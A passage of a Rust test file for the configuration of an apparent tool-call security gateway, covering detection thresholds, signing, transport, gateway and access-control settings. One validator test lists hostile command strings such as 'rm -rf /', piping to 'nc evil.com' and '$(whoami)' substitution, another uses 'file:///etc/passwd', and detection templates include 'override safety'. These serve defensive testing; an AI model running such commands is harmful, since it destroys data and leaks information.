fn test_data_flow_config_absent_uses_defaults() {
    let config = minimal_config();
    assert!(!config.data_flow.enabled);
    assert_eq!(config.data_flow.max_findings, 500);
}

#[test]
fn test_validate_rejects_data_flow_max_findings_too_large() {
    let mut config = minimal_config();
    config.data_flow.max_findings = MAX_DATA_FLOW_FINDINGS + 1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("data_flow.max_findings"), "got: {}", err);
}

#[test]
fn test_validate_rejects_data_flow_max_fingerprints_too_large() {
    let mut config = minimal_config();
    config.data_flow.max_fingerprints_per_pattern = MAX_DATA_FLOW_FINGERPRINTS + 1;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("data_flow.max_fingerprints_per_pattern"),
        "got: {}",
        err
    );
}

#[test]
fn test_validate_accepts_data_flow_at_max() {
    let mut config = minimal_config();
    config.data_flow.max_findings = MAX_DATA_FLOW_FINDINGS;
    config.data_flow.max_fingerprints_per_pattern = MAX_DATA_FLOW_FINGERPRINTS;
    assert!(config.validate().is_ok());
}

// ── Semantic detection config tests ──────────────────

#[test]
fn test_semantic_detection_config_defaults() {
    let config = SemanticDetectionConfig::default();
    assert!(!config.enabled);
    assert!((config.threshold - 0.45).abs() < f64::EPSILON);
    assert_eq!(config.min_text_length, 10);
    assert!(config.extra_templates.is_empty());
}

#[test]
fn test_semantic_detection_config_from_toml() {
    let toml = r#"
[semantic_detection]
enabled = true
threshold = 0.5
min_text_length = 20
extra_templates = ["steal all the data", "override safety"]

[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.semantic_detection.enabled);
    assert!((config.semantic_detection.threshold - 0.5).abs() < f64::EPSILON);
    assert_eq!(config.semantic_detection.min_text_length, 20);
    assert_eq!(config.semantic_detection.extra_templates.len(), 2);
}

#[test]
fn test_semantic_detection_config_absent_uses_defaults() {
    let config = minimal_config();
    assert!(!config.semantic_detection.enabled);
    assert!((config.semantic_detection.threshold - 0.45).abs() < f64::EPSILON);
}

#[test]
fn test_validate_rejects_semantic_threshold_zero() {
    let mut config = minimal_config();
    config.semantic_detection.enabled = true;
    config.semantic_detection.threshold = 0.0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("semantic_detection.threshold"), "got: {}", err);
}

#[test]
fn test_validate_rejects_semantic_threshold_nan() {
    let mut config = minimal_config();
    config.semantic_detection.enabled = true;
    config.semantic_detection.threshold = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(err.contains("semantic_detection.threshold"), "got: {}", err);
}

#[test]
fn test_validate_rejects_semantic_threshold_above_one() {
    let mut config = minimal_config();
    config.semantic_detection.enabled = true;
    config.semantic_detection.threshold = 1.5;
    let err = config.validate().unwrap_err();
    assert!(err.contains("semantic_detection.threshold"), "got: {}", err);
}

#[test]
fn test_validate_rejects_semantic_too_many_templates() {
    let mut config = minimal_config();
    config.semantic_detection.extra_templates = (0..=MAX_SEMANTIC_EXTRA_TEMPLATES)
        .map(|i| format!("template {}", i))
        .collect();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("semantic_detection.extra_templates"),
        "got: {}",
        err
    );
}

#[test]
fn test_validate_accepts_semantic_at_one() {
    let mut config = minimal_config();
    config.semantic_detection.enabled = true;
    config.semantic_detection.threshold = 1.0;
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════
// ETDI Configuration Tests
// ═══════════════════════════════════════════════════

#[test]
fn test_etdi_config_default() {
    let config = EtdiConfig::default();
    assert!(!config.enabled);
    assert!(!config.require_signatures);
    assert_eq!(
        config.signature_algorithm,
        vellaveto_types::SignatureAlgorithm::Ed25519
    );
    assert!(config.data_path.is_none());
    assert!(!config.allowed_signers.has_any());
    assert!(!config.attestation.enabled);
    assert!(!config.version_pinning.enabled);
}

#[test]
fn test_etdi_config_toml_parsing() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[etdi]
enabled = true
require_signatures = true
signature_algorithm = "ed25519"
data_path = "/var/lib/vellaveto/etdi"

[etdi.allowed_signers]
fingerprints = ["abc123", "def456"]
spiffe_ids = ["spiffe://example.org/provider"]

[etdi.attestation]
enabled = true
transparency_log = true
rekor_url = "https://rekor.sigstore.dev"

[etdi.version_pinning]
enabled = true
enforcement = "block"
auto_pin = true
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.etdi.enabled);
    assert!(config.etdi.require_signatures);
    assert_eq!(
        config.etdi.data_path,
        Some("/var/lib/vellaveto/etdi".to_string())
    );
    assert_eq!(config.etdi.allowed_signers.fingerprints.len(), 2);
    assert_eq!(config.etdi.allowed_signers.spiffe_ids.len(), 1);
    assert!(config.etdi.attestation.enabled);
    assert!(config.etdi.attestation.transparency_log);
    assert_eq!(
        config.etdi.attestation.rekor_url,
        Some("https://rekor.sigstore.dev".to_string())
    );
    assert!(config.etdi.version_pinning.enabled);
    assert!(config.etdi.version_pinning.is_blocking());
    assert!(config.etdi.version_pinning.auto_pin);
}

#[test]
fn test_allowed_signers_has_any() {
    let empty = AllowedSignersConfig::default();
    assert!(!empty.has_any());

    let with_fingerprint = AllowedSignersConfig {
        fingerprints: vec!["abc".to_string()],
        spiffe_ids: vec![],
    };
    assert!(with_fingerprint.has_any());

    let with_spiffe = AllowedSignersConfig {
        fingerprints: vec![],
        spiffe_ids: vec!["spiffe://test".to_string()],
    };
    assert!(with_spiffe.has_any());
}

#[test]
fn test_allowed_signers_is_fingerprint_trusted() {
    let signers = AllowedSignersConfig {
        fingerprints: vec!["ABC123".to_string()],
        spiffe_ids: vec![],
    };
    // Case-insensitive match
    assert!(signers.is_fingerprint_trusted("abc123"));
    assert!(signers.is_fingerprint_trusted("ABC123"));
    assert!(!signers.is_fingerprint_trusted("xyz789"));
}

#[test]
fn test_allowed_signers_is_spiffe_trusted() {
    let signers = AllowedSignersConfig {
        fingerprints: vec![],
        spiffe_ids: vec!["spiffe://example.org/tool".to_string()],
    };
    assert!(signers.is_spiffe_trusted("spiffe://example.org/tool"));
    assert!(!signers.is_spiffe_trusted("spiffe://example.org/other"));
}

#[test]
fn test_version_pinning_is_blocking() {
    let warn = VersionPinningConfig {
        enabled: true,
        enforcement: "warn".to_string(),
        pins_path: None,
        auto_pin: false,
    };
    assert!(!warn.is_blocking());

    let block = VersionPinningConfig {
        enabled: true,
        enforcement: "block".to_string(),
        pins_path: None,
        auto_pin: false,
    };
    assert!(block.is_blocking());

    // Case-insensitive
    let block_caps = VersionPinningConfig {
        enabled: true,
        enforcement: "BLOCK".to_string(),
        pins_path: None,
        auto_pin: false,
    };
    assert!(block_caps.is_blocking());
}

// ═══════════════════════════════════════════════════
// LIMITS CONFIG TESTS
// ═══════════════════════════════════════════════════

#[test]
fn test_limits_config_defaults() {
    let config = LimitsConfig::default();
    assert_eq!(config.max_response_body_bytes, 10 * 1024 * 1024);
    assert_eq!(config.max_sse_event_bytes, 1024 * 1024);
    assert_eq!(config.max_jsonrpc_line_bytes, 1024 * 1024);
    assert_eq!(config.max_call_chain_length, 20);
    assert_eq!(config.call_chain_max_age_secs, 300);
    assert_eq!(config.request_timeout_secs, 30);
    assert_eq!(config.max_action_history, 100);
    assert_eq!(config.max_pending_tool_calls, 256);
    assert_eq!(config.max_call_chain_header_bytes, 8192);
    assert_eq!(config.max_trace_header_bytes, 4096);
    assert_eq!(config.max_jsonrpc_id_key_len, 256);
}

#[test]
fn test_limits_config_from_toml() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[limits]
max_response_body_bytes = 52428800
max_sse_event_bytes = 2097152
max_jsonrpc_line_bytes = 2097152
max_call_chain_length = 50
call_chain_max_age_secs = 600
request_timeout_secs = 60
max_action_history = 200
max_pending_tool_calls = 512
max_call_chain_header_bytes = 16384
max_trace_header_bytes = 8192
max_jsonrpc_id_key_len = 512
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.limits.max_response_body_bytes, 50 * 1024 * 1024);
    assert_eq!(config.limits.max_sse_event_bytes, 2 * 1024 * 1024);
    assert_eq!(config.limits.max_jsonrpc_line_bytes, 2 * 1024 * 1024);
    assert_eq!(config.limits.max_call_chain_length, 50);
    assert_eq!(config.limits.call_chain_max_age_secs, 600);
    assert_eq!(config.limits.request_timeout_secs, 60);
    assert_eq!(config.limits.max_action_history, 200);
    assert_eq!(config.limits.max_pending_tool_calls, 512);
    assert_eq!(config.limits.max_call_chain_header_bytes, 16384);
    assert_eq!(config.limits.max_trace_header_bytes, 8192);
    assert_eq!(config.limits.max_jsonrpc_id_key_len, 512);
}

#[test]
fn test_limits_config_partial_override() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[limits]
max_response_body_bytes = 5242880
request_timeout_secs = 120
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    // Overridden values
    assert_eq!(config.limits.max_response_body_bytes, 5 * 1024 * 1024);
    assert_eq!(config.limits.request_timeout_secs, 120);
    // Default values
    assert_eq!(config.limits.max_sse_event_bytes, 1024 * 1024);
    assert_eq!(config.limits.max_call_chain_length, 20);
    assert_eq!(config.limits.call_chain_max_age_secs, 300);
    assert_eq!(config.limits.max_action_history, 100);
}

#[test]
fn test_limits_config_json_roundtrip() {
    let config = LimitsConfig {
        max_response_body_bytes: 20 * 1024 * 1024,
        max_sse_event_bytes: 2 * 1024 * 1024,
        max_jsonrpc_line_bytes: 2 * 1024 * 1024,
        max_call_chain_length: 40,
        call_chain_max_age_secs: 600,
        request_timeout_secs: 60,
        max_action_history: 200,
        max_pending_tool_calls: 512,
        max_call_chain_header_bytes: 16384,
        max_trace_header_bytes: 8192,
        max_jsonrpc_id_key_len: 512,
    };

    let json = serde_json::to_string(&config).unwrap();
    let parsed: LimitsConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

// --- Extension config tests ---

#[test]
fn test_extension_config_default() {
    let config = ExtensionConfig::default();
    assert!(!config.enabled);
    assert!(config.allowed_extensions.is_empty());
    assert!(config.blocked_extensions.is_empty());
    assert!(!config.require_signatures);
    assert!(config.trusted_public_keys.is_empty());
    assert_eq!(config.default_resource_limits.max_concurrent_requests, 10);
    assert_eq!(config.default_resource_limits.max_requests_per_sec, 100);
    assert!(config.validate().is_ok());
}

#[test]
fn test_extension_config_validation() {
    let config = ExtensionConfig {
        enabled: true,
        default_resource_limits: vellaveto_types::ExtensionResourceLimits {
            max_concurrent_requests: 0,
            ..Default::default()
        },
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_concurrent_requests"));
}

// ═══════════════════════════════════════════════════════════════════════════
// Phase 18: Transport configuration
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn test_transport_config_defaults() {
    let config = TransportConfig::default();
    assert!(config.discovery_enabled);
    assert!(config.upstream_priorities.is_empty());
    assert!(config.restricted_transports.is_empty());
    assert!(config.advertise_capabilities);
    assert_eq!(config.max_fallback_retries, 1);
    assert_eq!(config.fallback_timeout_secs, 10);
}

#[test]
fn test_transport_config_validation_conflict() {
    use vellaveto_types::TransportProtocol;
    let config = TransportConfig {
        upstream_priorities: vec![TransportProtocol::Grpc],
        restricted_transports: vec![TransportProtocol::Grpc],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("both upstream_priorities and restricted_transports"));
}

#[test]
fn test_transport_config_validation_bounds() {
    let config = TransportConfig {
        max_fallback_retries: 11,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    let mut config = TransportConfig {
        fallback_timeout_secs: 0,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    config.fallback_timeout_secs = 121;
    assert!(config.validate().is_err());

    config.fallback_timeout_secs = 60;
    assert!(config.validate().is_ok());
}

#[test]
fn test_transport_config_toml_deserialization() {
    let toml_str = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[transport]
discovery_enabled = false
max_fallback_retries = 3
fallback_timeout_secs = 30
"#;
    let config = PolicyConfig::from_toml(toml_str).unwrap();
    assert!(!config.transport.discovery_enabled);
    assert_eq!(config.transport.max_fallback_retries, 3);
    assert_eq!(config.transport.fallback_timeout_secs, 30);
}

// ═══════════════════════════════════════════════════
// PHASE 29: CROSS-TRANSPORT FALLBACK CONFIG TESTS
// ═══════════════════════════════════════════════════

#[test]
fn test_transport_config_cross_fallback_defaults() {
    let config = TransportConfig::default();
    assert!(!config.cross_transport_fallback);
    assert!(config.transport_overrides.is_empty());
    assert_eq!(config.transport_circuit_breaker_failure_threshold, 3);
    assert_eq!(config.transport_circuit_breaker_open_duration_secs, 30);
    assert!(!config.stdio_fallback_enabled);
    assert!(config.stdio_command.is_none());
    assert!(config.validate().is_ok());
}

#[test]
fn test_transport_config_cb_threshold_validation() {
    use vellaveto_types::TransportProtocol;
    // Zero threshold (below minimum)
    let config = TransportConfig {
        transport_circuit_breaker_failure_threshold: 0,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("transport_circuit_breaker_failure_threshold"));

    // Above maximum
    let config = TransportConfig {
        transport_circuit_breaker_failure_threshold: 51,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    // Valid boundary values
    let config = TransportConfig {
        transport_circuit_breaker_failure_threshold: 1,
        ..Default::default()
    };
    assert!(config.validate().is_ok());

    let config = TransportConfig {
        transport_circuit_breaker_failure_threshold: 50,
        ..Default::default()
    };
    assert!(config.validate().is_ok());

    // Open duration boundaries
    let config = TransportConfig {
        transport_circuit_breaker_open_duration_secs: 0,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    let config = TransportConfig {
        transport_circuit_breaker_open_duration_secs: 601,
        ..Default::default()
    };
    assert!(config.validate().is_err());

    let config = TransportConfig {
        transport_circuit_breaker_open_duration_secs: 600,
        ..Default::default()
    };
    assert!(config.validate().is_ok());

    let _ = TransportProtocol::Http; // suppress unused import warning
}

#[test]
fn test_transport_config_overrides_empty_vec_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert("fs_*".to_string(), Vec::new());
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("must not be empty"));
    let _ = TransportProtocol::Http;
}

#[test]
fn test_transport_config_overrides_restricted_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert("db_*".to_string(), vec![TransportProtocol::Grpc]);
    let config = TransportConfig {
        transport_overrides: overrides,
        restricted_transports: vec![TransportProtocol::Grpc],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("restricted transport"));
}

#[test]
fn test_transport_config_stdio_requires_command() {
    let config = TransportConfig {
        stdio_fallback_enabled: true,
        stdio_command: None,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("stdio_command"));
}

#[test]
fn test_transport_config_stdio_empty_command_rejected() {
    let config = TransportConfig {
        stdio_fallback_enabled: true,
        stdio_command: Some("  ".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_transport_config_stdio_valid() {
    let config = TransportConfig {
        stdio_fallback_enabled: true,
        stdio_command: Some("/usr/bin/mcp-server".to_string()),
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

// FIND-R41-002: stdio_command must be absolute path
#[test]
fn test_transport_config_stdio_relative_path_rejected() {
    let config = TransportConfig {
        stdio_fallback_enabled: true,
        stdio_command: Some("mcp-server".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("absolute path"), "got: {}", err);
}

// FIND-R41-002: stdio_command with shell metacharacters rejected
#[test]
fn test_transport_config_stdio_metacharacters_rejected() {
    for cmd in &[
        "/usr/bin/cmd; rm -rf /",
        "/usr/bin/cmd | nc evil.com",
        "/usr/bin/cmd$(whoami)",
        "/usr/bin/cmd`whoami`",
        "/usr/bin/cmd > /tmp/out",
    ] {
        let config = TransportConfig {
            stdio_fallback_enabled: true,
            stdio_command: Some(cmd.to_string()),
            ..Default::default()
        };
        assert!(
            config.validate().is_err(),
            "expected rejection for command: {}",
            cmd
        );
    }
}

// FIND-R41-009: transport_overrides count bounded
#[test]
fn test_transport_config_overrides_count_bounded() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    for i in 0..101 {
        overrides.insert(
            format!("tool_{}", i),
            vec![TransportProtocol::Http],
        );
    }
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("101 entries"), "got: {}", err);
}

// FIND-R41-014: transport_overrides empty key rejected
#[test]
fn test_transport_config_overrides_empty_key_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(String::new(), vec![TransportProtocol::Http]);
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("empty key"), "got: {}", err);
}

// FIND-R41-014: transport_overrides null byte in key rejected
#[test]
fn test_transport_config_overrides_null_byte_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert("tool_\0bad".to_string(), vec![TransportProtocol::Http]);
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    // FIND-R44-007: Now caught by broader ASCII control character check.
    assert!(err.contains("control characters"), "got: {}", err);
}

#[test]
fn test_transport_config_cross_fallback_serde_roundtrip() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "fs_*".to_string(),
        vec![TransportProtocol::Http, TransportProtocol::WebSocket],
    );
    let config = TransportConfig {
        cross_transport_fallback: true,
        transport_overrides: overrides,
        transport_circuit_breaker_failure_threshold: 5,
        transport_circuit_breaker_open_duration_secs: 60,
        stdio_fallback_enabled: true,
        stdio_command: Some("/usr/bin/mcp-server".to_string()),
        ..Default::default()
    };
    let json_str = serde_json::to_string(&config).unwrap();
    let deserialized: TransportConfig = serde_json::from_str(&json_str).unwrap();
    assert_eq!(config, deserialized);
}

#[test]
fn test_transport_config_overrides_valid() {
    use vellaveto_types::TransportProtocol;
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "db_*".to_string(),
        vec![TransportProtocol::Grpc, TransportProtocol::Http],
    );
    let config = TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_gateway_backend_transport_urls_empty_url_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(TransportProtocol::Grpc, "  ".to_string());
    let config = GatewayConfig {
        enabled: true,
        backends: vec![BackendConfig {
            id: "b1".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec!["test_".to_string()],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("transport_urls"));
    assert!(err.contains("must not be empty"));
}

#[test]
fn test_gateway_backend_transport_urls_valid() {
    use vellaveto_types::TransportProtocol;
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(
        TransportProtocol::Grpc,
        "http://localhost:50051".to_string(),
    );
    transport_urls.insert(
        TransportProtocol::WebSocket,
        "ws://localhost:8000/ws".to_string(),
    );
    let config = GatewayConfig {
        enabled: true,
        backends: vec![BackendConfig {
            id: "b1".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec!["test_".to_string()],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

// FIND-R41-008: transport_urls with bad URL scheme rejected
#[test]
fn test_gateway_backend_transport_urls_bad_scheme_rejected() {
    use vellaveto_types::TransportProtocol;
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(TransportProtocol::Http, "file:///etc/passwd".to_string());
    let config = GatewayConfig {
        enabled: true,
        backends: vec![BackendConfig {
            id: "b1".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec!["test_".to_string()],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("invalid URL scheme"), "got: {}", err);
}

// FIND-R41-008: WebSocket transport_url requires ws:// or wss://
#[test]
fn test_gateway_backend_transport_urls_ws_scheme_validated() {
    use vellaveto_types::TransportProtocol;
    let mut transport_urls = std::collections::HashMap::new();
    transport_urls.insert(
        TransportProtocol::WebSocket,
        "http://localhost:8000/ws".to_string(),
    );
    let config = GatewayConfig {
        enabled: true,
        backends: vec![BackendConfig {
            id: "b1".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec!["test_".to_string()],
            weight: 100,
            transport_urls,
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("invalid URL scheme"), "got: {}", err);
}

// ═══════════════════════════════════════════════════
// PHASE 20: GATEWAY CONFIG TESTS
// ═══════════════════════════════════════════════════

#[test]
fn test_gateway_config_default() {
    let config = GatewayConfig::default();
    assert!(!config.enabled);
    assert!(config.backends.is_empty());
    assert_eq!(config.health_check_interval_secs, 15);
    assert_eq!(config.unhealthy_threshold, 3);
    assert_eq!(config.healthy_threshold, 2);
}

#[test]
fn test_gateway_config_toml_parse() {
    let toml_str = r#"
[[policies]]
name = "allow-all"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[gateway]
enabled = true
health_check_interval_secs = 10
unhealthy_threshold = 5
healthy_threshold = 3

[[gateway.backends]]
id = "fs-server"
url = "http://localhost:8001/mcp"
tool_prefixes = ["fs_", "file_"]
weight = 90

[[gateway.backends]]
id = "default"
url = "http://localhost:8000/mcp"
"#;
    let config = PolicyConfig::from_toml(toml_str).unwrap();
    assert!(config.gateway.enabled);
    assert_eq!(config.gateway.backends.len(), 2);
    assert_eq!(config.gateway.backends[0].id, "fs-server");
    assert_eq!(
        config.gateway.backends[0].tool_prefixes,
        vec!["fs_", "file_"]
    );
    assert_eq!(config.gateway.backends[0].weight, 90);
    assert_eq!(config.gateway.backends[1].id, "default");
    assert!(config.gateway.backends[1].tool_prefixes.is_empty());
    assert_eq!(config.gateway.backends[1].weight, 100); // default
    assert_eq!(config.gateway.health_check_interval_secs, 10);
    assert!(config.validate().is_ok());
}

#[test]
fn test_gateway_config_validate_duplicate_ids() {
    let mut config = minimal_config();
    config.gateway.enabled = true;
    config.gateway.backends = vec![
        BackendConfig {
            id: "dup".to_string(),
            url: "http://a:8000".to_string(),
            tool_prefixes: vec!["a_".to_string()],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        },
        BackendConfig {
            id: "dup".to_string(),
            url: "http://b:8000".to_string(),
            tool_prefixes: vec!["b_".to_string()],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        },
    ];
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicate id"), "got: {}", err);
}

#[test]
fn test_gateway_config_validate_zero_weight() {
    let mut config = minimal_config();
    config.gateway.enabled = true;
    config.gateway.backends = vec![BackendConfig {
        id: "b".to_string(),
        url: "http://a:8000".to_string(),
        tool_prefixes: vec![],
        weight: 0,
        transport_urls: std::collections::HashMap::new(),
    }];
    let err = config.validate().unwrap_err();
    assert!(err.contains("weight must be >= 1"), "got: {}", err);
}

#[test]
fn test_gateway_config_validate_interval_bounds() {
    let mut config = minimal_config();
    config.gateway.enabled = true;
    config.gateway.backends = vec![BackendConfig {
        id: "b".to_string(),
        url: "http://a:8000".to_string(),
        tool_prefixes: vec![],
        weight: 100,
        transport_urls: std::collections::HashMap::new(),
    }];

    config.gateway.health_check_interval_secs = 4;
    assert!(config.validate().unwrap_err().contains("[5, 300]"));

    config.gateway.health_check_interval_secs = 301;
    assert!(config.validate().unwrap_err().contains("[5, 300]"));

    config.gateway.health_check_interval_secs = 15;
    assert!(config.validate().is_ok());
}

#[test]
fn test_gateway_config_disabled_skips_validation() {
    let mut config = minimal_config();
    config.gateway.enabled = false;
    // Invalid: no backends, but validation should skip because disabled
    config.gateway.backends = vec![];
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 21: ABAC config tests
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_abac_default_config_valid() {
    let config = minimal_config();
    assert!(!config.abac.enabled);
    assert!(config.abac.policies.is_empty());
    assert!(config.validate().is_ok());
}

#[test]
fn test_abac_toml_parse_with_policies() {
    let toml = r#"
[[policies]]
name = "allow-all"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[abac]
enabled = true

[[abac.policies]]
id = "p1"
description = "Permit agents to read"
effect = "permit"
priority = 10

[abac.policies.principal]
principal_type = "Agent"
id_patterns = ["code-*"]

[abac.policies.action]
patterns = ["filesystem:read_*"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.abac.enabled);
    assert_eq!(config.abac.policies.len(), 1);
    assert_eq!(config.abac.policies[0].id, "p1");
    assert_eq!(
        config.abac.policies[0].effect,
        vellaveto_types::AbacEffect::Permit
    );
    assert!(config.validate().is_ok());
}

#[test]
fn test_abac_validation_duplicate_policy_ids() {
    let mut config = minimal_config();
    config.abac.enabled = true;
    let policy = vellaveto_types::AbacPolicy {
        id: "dup".to_string(),
        description: "test".to_string(),
        effect: vellaveto_types::AbacEffect::Permit,
        priority: 0,
        principal: Default::default(),
        action: Default::default(),
        resource: Default::default(),
        conditions: vec![],
    };
    config.abac.policies = vec![policy.clone(), policy];
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicate id"), "got: {}", err);
}

#[test]
fn test_abac_validation_too_many_policies() {
    let mut config = minimal_config();
    config.abac.enabled = true;
    config.abac.policies = (0..513)
        .map(|i| vellaveto_types::AbacPolicy {
            id: format!("p{}", i),
            description: "test".to_string(),
            effect: vellaveto_types::AbacEffect::Permit,
            priority: 0,
            principal: Default::default(),
            action: Default::default(),
            resource: Default::default(),
            conditions: vec![],
        })
        .collect();
    let err = config.validate().unwrap_err();
    assert!(err.contains("max is 512"), "got: {}", err);
}

#[test]
fn test_abac_validation_invalid_risk_threshold() {
    let mut config = minimal_config();
    config.abac.enabled = true;
    config.abac.continuous_auth.enabled = true;
    config.abac.continuous_auth.risk_threshold = 1.5;
    let err = config.validate().unwrap_err();
    assert!(err.contains("risk_threshold"), "got: {}", err);
}

#[test]
fn test_abac_disabled_skips_validation() {
    let mut config = minimal_config();
    config.abac.enabled = false;
    // Invalid: too many policies, but validation should skip because disabled
    config.abac.policies = (0..600)
        .map(|i| vellaveto_types::AbacPolicy {
            id: format!("p{}", i),
            description: "test".to_string(),
            effect: vellaveto_types::AbacEffect::Permit,
            priority: 0,
            principal: Default::default(),
            action: Default::default(),
            resource: Default::default(),
            conditions: vec![],
        })
        .collect();
    assert!(config.validate().is_ok());
}

// ── Multimodal policy config tests ──────────────────────────────

#[test]
fn test_multimodal_config_defaults_when_absent() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(!config.multimodal.enabled);
    assert!(config.multimodal.enable_ocr);
    assert_eq!(config.multimodal.max_image_size, 10 * 1024 * 1024);
    assert_eq!(config.multimodal.max_audio_size, 50 * 1024 * 1024);
    assert_eq!(config.multimodal.max_video_size, 100 * 1024 * 1024);
    assert_eq!(config.multimodal.ocr_timeout_ms, 5000);
    assert!(!config.multimodal.enable_stego_detection);
    assert_eq!(config.multimodal.content_types, vec!["Image".to_string()]);
    assert!(config.multimodal.blocked_content_types.is_empty());
}

#[test]
fn test_multimodal_config_from_toml_full() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[multimodal]
enabled = true
enable_ocr = false
max_image_size = 20971520
max_audio_size = 104857600
max_video_size = 209715200
ocr_timeout_ms = 3000
min_ocr_confidence = 0.7
enable_stego_detection = true
content_types = ["Image", "Pdf", "Audio", "Video"]
blocked_content_types = ["Video"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.multimodal.enabled);
    assert!(!config.multimodal.enable_ocr);
    assert_eq!(config.multimodal.max_image_size, 20 * 1024 * 1024);
    assert_eq!(config.multimodal.max_audio_size, 100 * 1024 * 1024);
    assert_eq!(config.multimodal.max_video_size, 200 * 1024 * 1024);
    assert_eq!(config.multimodal.ocr_timeout_ms, 3000);
    assert!((config.multimodal.min_ocr_confidence - 0.7).abs() < f32::EPSILON);
    assert!(config.multimodal.enable_stego_detection);
    assert_eq!(config.multimodal.content_types.len(), 4);
    assert_eq!(config.multimodal.blocked_content_types, vec!["Video"]);
}

#[test]
fn test_multimodal_config_partial_override() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[multimodal]
enabled = true
content_types = ["Image", "Audio"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.multimodal.enabled);
    // Non-specified fields should have defaults
    assert!(config.multimodal.enable_ocr);
    assert_eq!(config.multimodal.max_image_size, 10 * 1024 * 1024);
    assert_eq!(config.multimodal.content_types.len(), 2);
    assert!(config.multimodal.blocked_content_types.is_empty());
}

#[test]
fn test_multimodal_config_json_roundtrip() {
    let config = MultimodalPolicyConfig {
        enabled: true,
        enable_ocr: true,
        max_image_size: 5_000_000,
        max_audio_size: 25_000_000,
        max_video_size: 50_000_000,
        ocr_timeout_ms: 2000,
        min_ocr_confidence: 0.6,
